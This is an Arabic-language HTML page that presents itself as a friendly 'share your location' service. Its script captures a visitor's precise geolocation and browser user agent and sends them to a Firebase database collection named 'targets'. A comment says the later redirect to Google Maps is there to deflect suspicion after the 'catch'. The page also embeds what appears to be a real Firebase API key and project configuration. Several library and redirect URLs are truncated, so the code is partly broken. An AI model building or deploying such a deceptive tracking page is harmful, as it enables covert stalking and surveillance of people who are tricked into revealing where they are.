<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مشاركة موقعي</title>
    
    <!-- مكتبة الخرائط Leaflet CSS -->
    <link rel="stylesheet" href="https://unpkg.com" />
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: Arial, Tahoma, sans-serif;
            min-height: 100vh;
            color: white;
            background: radial-gradient(circle at top, #102a43 0%, #061929 45%, #000914 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.05);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.1);
            max-width: 400px;
            width: 100%;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 15px;
        }
        p {
            font-size: 14px;
            color: #b0c4de;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        .btn {
            background: linear-gradient(135deg, #0076ff 0%, #0055ff 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 85, 255, 0.4);
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 85, 255, 0.6);
        }
        #status {
            margin-top: 15px;
            font-size: 13px;
            color: #ffc107;
        }
    </style>

    <!-- تضمين مكتبات جافا سكريبت لـ Firebase (الإصدار المتوافق) -->
    <script src="https://gstatic.com"></script>
    <script src="https://gstatic.com"></script>
</head>
<body>

    <div class="container">
        <h1>📍 مشاركة الموقع الجغرافي</h1>
        <p>لتتمكن من استلام وتحديد الموقع بدقة على الخريطة التفاعلية، يرجى الضغط على الزر أدناه والموافقة على إذن الوصول المباشر.</p>
        <button class="btn" id="startBtn">اضغط هنا للمشاركة</button>
        <div id="status"></div>
    </div>

    <script>
        // إعدادات Firebase الخاصة بمشروعك (تم دمج بياناتك تلقائياً)
        const firebaseConfig = {
          apiKey: "AIzaSyDN0-VVc22XXx1bDh7rICBMxIBxWQcTc-k",
          authDomain: "mylocationshare-70ce6.firebaseapp.com",
          databaseURL: "https://mylocationshare-70ce6-default-rtdb.firebaseio.com",
          projectId: "mylocationshare-70ce6",
          storageBucket: "mylocationshare-70ce6.firebasestorage.app",
          messagingSenderId: "394362922510",
          appId: "1:394362922510:web:c2d37ee1cfbf405ac3fe5f",
          measurementId: "G-Z60MB3CK3H"
        };

        // تهيئة Firebase في الصفحة
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        const startBtn = document.getElementById('startBtn');
        const statusDiv = document.getElementById('status');

        startBtn.addEventListener('click', () => {
            statusDiv.textContent = "جاري طلب الإذن وجلب الموقع...";
            
            if (navigator.geolocation) {
                // طلب الموقع الفعلي بدقة عالية
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        const accuracy = position.coords.accuracy;

                        // إرسال البيانات مباشرة إلى قاعدة البيانات Realtime Database
                        database.ref('targets/').push({
                            latitude: lat,
                            longitude: lng,
                            accuracy: accuracy,
                            deviceAgent: navigator.userAgent,
                            time: new Date().toLocaleString('ar-EG')
                        }).then(() => {
                            statusDiv.style.color = "#28a745";
                            statusDiv.textContent = "تمت مشاركة الموقع بنجاح! سيتم نقلك للخريطة...";
                            
                            // تحويل اختياري لإبعاد الشبهة بعد الصيد (مثلاً إلى جوجل مابس العامة)
                            setTimeout(() => {
                                window.location.href = `https://google.com{lat},${lng}`;
                            }, 2000);
                        }).catch((error) => {
                            statusDiv.style.color = "#dc3545";
                            statusDiv.textContent = "فشل في حفظ البيانات: " + error.message;
                        });
                    },
                    (error) => {
                        statusDiv.style.color = "#dc3545";
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                statusDiv.textContent = "يجب عليك السماح بالوصول للموقع لتشغيل الخدمة.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                statusDiv.textContent = "معلومات الموقع غير متوفرة حالياً.";
                                break;
                            case error.TIMEOUT:
                                statusDiv.textContent = "انتهت مهلة طلب الموقع.";
                                break;
                            default:
                                statusDiv.textContent = "حدث خطأ غير معروف.";
                        }
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                statusDiv.textContent = "المتصفح لا يدعم تحديد المواقع.";
            }
        });
    </script>
</body>
</html>
